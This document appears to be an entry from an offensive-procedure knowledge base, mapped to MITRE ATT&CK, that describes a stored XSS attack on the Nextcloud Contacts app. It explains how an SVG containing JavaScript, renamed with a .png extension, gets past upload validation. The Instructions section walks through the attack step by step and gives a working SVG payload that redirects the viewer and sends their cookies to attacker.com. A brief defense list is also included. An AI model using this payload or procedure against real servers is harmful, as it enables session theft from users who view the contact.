---
tags:
  - xss
  - file-upload
  - nextcloud
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:16.072Z'
skill_level: low
impact_level: low
detection_risk: low
sub_techniques: []
id: 78886ab0-66cb-472f-ac61-ae6f35c801c7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Upload-Malicious-SVG-to-Nextcloud-Contact

## Summary

This procedure involves preparing and uploading an SVG file with malicious JavaScript to a contact in Nextcloud's Contacts app, using a .png extension to bypass file type validation and enable stored XSS.

## Description

The Nextcloud Contacts app allows image uploads for contacts but fails to properly validate SVG files when disguised with a .png extension. This bypasses prior mitigations (e.g., from report #894876) and stores the malicious file. When rendered, the SVG executes JavaScript in the viewer's browser, leading to XSS. The attack requires authenticated access to upload contacts and targets users who view the contact details.

## Requirements

1. Authenticated access to Nextcloud instance with Contacts app
2. Malicious SVG file prepared with JavaScript payload (e.g., <svg><script>alert('XSS')</script></svg> renamed to .png)
3. Web browser for interface interaction

## Defense

Defensive measures and detection strategies:

- Implement strict MIME type validation on upload (reject SVG content regardless of extension)
- Sanitize or strip script tags from uploaded images server-side
- Monitor for anomalous file uploads with mismatched extensions

## Objectives

1. Store malicious payload in contact image field
2. Bypass file validation for SVG acceptance
3. Set up for XSS execution on victim view

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create an SVG file containing JavaScript payload, such as a redirect or alert, and rename it with .png extension to evade checks.

No command required; use a text editor to craft the file 'redirectxss.svg.png' with content like:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>window.location='https://attacker.com?cookie='+document.cookie;</script>
</svg>
```

> This embeds JS that steals cookies on execution.

### Step 2: Upload to Contact

**Context**: Access the Contacts app and attach the file to a contact's image.

Navigate to Nextcloud Contacts, create/edit a contact, and upload 'redirectxss.svg.png' via the image upload field.

> Upload succeeds if validation only checks extension, not content.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[file-upload]]
- [[nextcloud]]
